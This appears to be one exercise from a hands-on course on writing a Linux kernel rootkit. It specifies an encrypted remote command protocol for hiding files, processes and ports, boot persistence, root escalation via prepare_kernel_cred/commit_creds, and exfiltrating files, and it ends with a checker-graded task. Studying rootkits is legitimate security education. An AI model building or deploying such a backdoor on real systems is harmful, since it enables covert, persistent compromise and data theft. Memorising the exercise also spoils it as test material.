# Wire all commands to the encrypted protocol

The individual capabilities (INFO, LIST, HIDE/UNHIDE, PERSIST, ESCALATE, SHELL,
EXEC, DOWNLOAD) were each tested over plaintext TCP.
Now wire every remaining command into the encrypted wire protocol, achieving
full remote parity with the local mkdir-based control channel.

## Command table

```text
Command             Action
-------             ------
PING                Reply PONG (keepalive)
INFO                utsname: sysname, nodename, release, version, machine
STATUS              Current state: hidden counts, cloak, persist, connection
LIST FILE           Enumerate hidden file targets
LIST PID            Enumerate hidden PID targets
LIST CONTENT        Enumerate hidden content targets
LIST PORT           Enumerate hidden port targets
HIDE FILE <name>    Add to file_targets
HIDE PID <pid>      Add to pid_targets
HIDE CONTENT <str>  Add to content_targets
HIDE PORT <port>    Add to port_targets
UNHIDE FILE <name>  Remove from file_targets
UNHIDE PID <pid>    Remove from pid_targets
UNHIDE CONTENT <s>  Remove from content_targets
UNHIDE PORT <port>  Remove from port_targets
PERSIST             Write boot-persistence config
UNPERSIST           Remove boot-persistence config
ESCALATE            Grant root to connected operator session
DOWNLOAD <path>     Read file in chunks, send encrypted frames
```

## INFO handler

```c
struct new_utsname *uts = utsname();
```

Format sysname, nodename, release, version, and machine into a single response
buffer.
Send it as one encrypted frame.

## STATUS handler

Report current state as key-value pairs:

```text
files: 3
pids: 1
contents: 0
ports: 2
cloaked: yes
persisted: no
```

Read each count from the target arrays, check boolean state flags, format, send.

## LIST with subcommands

Parse the word after LIST to select the target array.
Iterate and format each entry as `[index] value`.
Send "empty" if the count is zero.

## HIDE and UNHIDE variants

HIDE adds an entry to the appropriate target array (check capacity, validate
input, copy into the array, increment count).
UNHIDE finds and removes the matching entry (shift remaining entries down,
decrement count).

## PERSIST and UNPERSIST

PERSIST writes the boot configuration using `call_usermodehelper` or `filp_open`
plus `kernel_write`.
UNPERSIST removes it.
Both send a status response.

## ESCALATE

Grant root privileges to the operator's connected session:

```c
struct cred *new = prepare_kernel_cred(NULL);
if (new)
    commit_creds(new);
```

This gives the calling context full capabilities.
Send confirmation.

## DOWNLOAD

Open the requested file with `filp_open`, read in `RK_BUF_MAX`-sized chunks with
`kernel_read`, send each chunk as a separate encrypted frame.
Send an empty frame to signal end-of-file.
Close with `filp_close`.

## Every response is encrypted

All command responses must go through the encrypted frame sender, not raw
`kernel_sendmsg`.
The protocol flow for every command:

```text
recv encrypted frame -> decrypt -> parse command -> execute
    -> format response -> encrypt -> send encrypted frame
```

## Your task

Edit `execution/commands.c`:

1. Add the 12 remaining command handlers (status, info, hide/unhide variants,
   list, persist, unpersist, escalate, download).

Edit `execution/dispatch.c`:

2. Expand the dispatch table to all 20 commands.
   Longest prefixes first.

Edit `include/rootkit.h`:

3. Add prototypes for all new command handlers.

Run:

```sh
./rklings check
```

## References

- [`prepare_kernel_cred` and `commit_creds`][cred]
- [`filp_open`, `kernel_read`, `filp_close`][fs]
- [`utsname()`][utsname]

[cred]: https://github.com/torvalds/linux/blob/v7.2/kernel/cred.c
[fs]: https://github.com/torvalds/linux/blob/v7.2/include/linux/fs.h
[utsname]: https://github.com/torvalds/linux/blob/v7.2/include/linux/utsname.h
